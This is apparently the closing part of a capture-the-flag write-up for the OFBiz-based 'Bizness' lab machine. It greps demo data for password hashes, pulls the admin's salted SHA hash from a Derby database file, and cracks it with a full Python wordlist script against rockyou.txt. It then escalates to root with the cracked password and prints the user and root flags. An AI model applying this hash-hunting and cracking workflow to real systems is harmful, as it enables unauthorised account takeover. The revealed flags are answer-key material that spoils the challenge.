./applications/datamodel/data/demo/ContentDemoData.xml:  195:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/ContentDemoData.xml:  205:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./applications/datamodel/data/demo/AccountingDemoData.xml:  1490:       Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./runtime/data/derby/ofbiz/seg0/c54d0.dat:   21:        Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
./framework/resources/templates/AdminUserLoginData.xml:  22:    Password="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a"
./framework/security/data/PasswordSecurityDemoData.xml:  23:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./framework/security/data/PasswordSecurityDemoData.xml:  33:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./framework/security/data/PasswordSecurityDemoData.xml:  34:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./framework/security/data/PasswordSecurityDemoData.xml:  35:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./framework/security/data/PasswordSecurityDemoData.xml:  36:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./framework/security/data/PasswordSecurityDemoData.xml:  37:    Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1815320:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  1815423:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  1815426:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  1815514:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  1815524:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  1817252:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  1817368:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1817375:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1817382:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1817517:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1817518:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1817519:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1817520:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1817521:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1817522:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1817523:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1820203:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1820211:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1820219:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1820227:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1820231:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1820260:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1820261:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1820262:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1820263:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1820273:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  1822116:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2093538:      Password="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a"
./build/distributions/ofbiz.tar:  2209171:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  2209181:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  2209182:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  2209183:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  2209184:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  2209185:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  2508154:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  2511574:      Password="{SHA}bbf272ce445e1c48d94096afdba6a7888c1df1fe"/>
./build/distributions/ofbiz.tar:  2511655:      Password="{SHA}bbf272ce445e1c48d94096afdba6a7888c1df1fe"/>
./build/distributions/ofbiz.tar:  2675880:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2675891:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2811224:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2811225:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2811226:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2811227:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2811228:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2811229:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2811230:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2811231:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2811232:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  2811233:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  3366549:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  3366550:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  3366551:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  3366552:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  3366554:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  3366555:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  3366556:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  3366557:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./build/distributions/ofbiz.tar:  3382116:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  3382117:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  3382118:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  3382119:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  3382120:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./build/distributions/ofbiz.tar:  3382121:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/example/testdef/assertdata/TestUserLoginData.xml:  24:        Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./plugins/ebaystore/data/DemoEbayStoreData.xml:   31:   Password="{SHA}bbf272ce445e1c48d94096afdba6a7888c1df1fe"/>
./plugins/ebaystore/data/DemoEbayStoreData.xml:  112:   Password="{SHA}bbf272ce445e1c48d94096afdba6a7888c1df1fe"/>
./plugins/ecommerce/data/DemoPurchasing.xml:   33:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/ecommerce/data/DemoPurchasing.xml:   44:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/scrum/data/scrumDemoData.xml:   90:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/scrum/data/scrumDemoData.xml:   91:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/scrum/data/scrumDemoData.xml:   92:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/scrum/data/scrumDemoData.xml:   93:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/scrum/data/scrumDemoData.xml:   94:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/scrum/data/scrumDemoData.xml:   95:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/scrum/data/scrumDemoData.xml:   96:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/scrum/data/scrumDemoData.xml:   97:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/scrum/data/scrumDemoData.xml:   98:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/scrum/data/scrumDemoData.xml:   99:   Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/myportal/data/MyPortalDemoData.xml:  23:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./plugins/myportal/data/MyPortalDemoData.xml:  24:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./plugins/myportal/data/MyPortalDemoData.xml:  25:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./plugins/myportal/data/MyPortalDemoData.xml:  26:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./plugins/myportal/data/MyPortalDemoData.xml:  28:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./plugins/myportal/data/MyPortalDemoData.xml:  29:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./plugins/myportal/data/MyPortalDemoData.xml:  30:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./plugins/myportal/data/MyPortalDemoData.xml:  31:      Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
./plugins/projectmgr/data/ProjectMgrDemoPasswordData.xml:  21:  Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/projectmgr/data/ProjectMgrDemoPasswordData.xml:  22:  Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/projectmgr/data/ProjectMgrDemoPasswordData.xml:  23:  Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/projectmgr/data/ProjectMgrDemoPasswordData.xml:  24:  Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/projectmgr/data/ProjectMgrDemoPasswordData.xml:  25:  Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
./plugins/projectmgr/data/ProjectMgrDemoPasswordData.xml:  26:  Password="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
ofbiz@bizness:/opt/ofbiz$
```

One file named (`c54d0.dat`) has a hash that stands out to me from the others:
```bash
./runtime/data/derby/ofbiz/seg0/c54d0.dat:   21:        Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
```

We need now get a little bit of context, to understand what is it. For this, I used `strings` to look into the `c54d0.dat` file since it is a binary file:
```bash
ofbiz@bizness:/opt/ofbiz$ strings ./runtime/data/derby/ofbiz/seg0/c54d0.dat
8501
<?xml version="1.0" encoding="UTF-8"?>
<ofbiz-ser>
<map-HashMap>
<map-Entry>
<map-Key>
<std-String value="recurrenceInfoId"/>
</map-Key>
<map-Value>
<std-String value="400"/>
</map-Value>
</map-Entry>
</map-HashMap>
</ofbiz-ser>

10000
J<?xml version="1.0" encoding="UTF-8"?><ofbiz-ser>
<map-HashMap>
<map-Entry>
<map-Key>
<std-String value="updatedUserLogin"/>
</map-Key>
<map-Value>
<eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-1603:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
</map-Value>
</map-Entry>
<map-Entry>
<map-Key>
<std-String value="locale"/>
</map-Key>
<map-Value>
<std-Locale value="en"/>
</map-Value>
</map-Entry>
</map-HashMap>
</ofbiz-ser>
```

This hash seems to be from the `admin` account, we could try to crack it by using a brute-force dictionary attack.

Analyzing the Hash:

- `$SHA`: This is the algorithm
- `$d`: This is the salt
- `$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`: This is the password result

We can create a Python Script to crack the hash by using the salt and the algorithm, here is an example:
```py
import hashlib
import base64
import os
import argparse

parser = argparse.ArgumentParser(description='Available command-line arguments')
parser.add_argument('-ht', '--hash_type', type=str, help='Hash Type')
parser.add_argument('-s', '--salt', type=str, help='Salt')
parser.add_argument('-hw', '--hash_wanted', type=str, help='Hash Wanted')
parser.add_argument('-w', '--wordlist', type=str, help='Wordlist')
args = parser.parse_args()

hash_type: str = args.hash_type
salt: str = args.salt
hash_wanted: str = args.hash_wanted
wordlist: str = args.wordlist


def check_hash_type(_hash_type):
    if _hash_type in hashlib.algorithms_guaranteed:
        return True
    else:
        return False


def create_hash_password(
        _hash_type="sha1",
        _salt=base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8'),
        password="password"
) -> str | None:
    try:
        _hash = hashlib.new(_hash_type)
        _hash.update(_salt.encode('utf-8'))
        _hash.update(password.encode('utf-8'))
        _hash_bytes = _hash.digest()
        return base64.urlsafe_b64encode(_hash_bytes).decode('utf-8')
    except Exception as e:
        print(e)
        return None


def find_hash_value(_hash_type, _salt, _hash_wanted, _wordlist) -> None:
    if check_hash_type(_hash_type) is False:
        print(f'[-] Hash Type Not Supported: {_hash_type}')
        print(f'[i] Supported Hash Types: {hashlib.algorithms_guaranteed}')
        return

    with open(_wordlist, 'r', encoding='latin-1') as password_list:
        for password in password_list:
            pwd = password.strip()
            hash_value = create_hash_password(_hash_type, _salt, pwd)

            if hash_value == _hash_wanted:
                print(f'[+] Hash Found: {hash_value} Password: {pwd}')
                break
            else:
                print(f'[-] Hash Not Found: {hash_value} Password: {pwd}')


find_hash_value(hash_type, salt, hash_wanted, wordlist)
```

Using the `rockyou.txt` as dictionary, we can get the password to the `admin` user.
```bash
ofbiz@bizness:/opt/ofbiz$ python3 hash_brute.py -ht 'sha1' -s 'd' -hw 'uP0_QaVBpDWFeo8-dRzDqRwXQ2I=' -w /usr/share/wordlists/rockyou.txt
# ...
# ... omitted unuseful info  
# ...
[+] Hash Found: uP0_QaVBpDWFeo8-dRzDqRwXQ2I= Password: monkeybizness
```

### Root Access

```bash
ofbiz@bizness:/opt/ofbiz$ su
Password:
root@bizness:/opt/ofbiz# ls -l /root
total 4
-rw-r----- 1 root root 33 Feb  7 13:24 root.txt
root@bizness:/opt/ofbiz# cat /root/root.txt
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

### Flag Codes
??? question "**Reveal Flags** 🏁"
    #### **User Flag**
        52f96b0064cf5ede3c6e98a947518892
    #### **Root Flag**
        60de45ea0ca280267dc368ba54628e0d

---

#### *If this was helpful in someway, [you can **support me** by zapping me some sats](https://getalby.com/p/0xrh0d4m1n)!*
#### *See you in the next writeup!*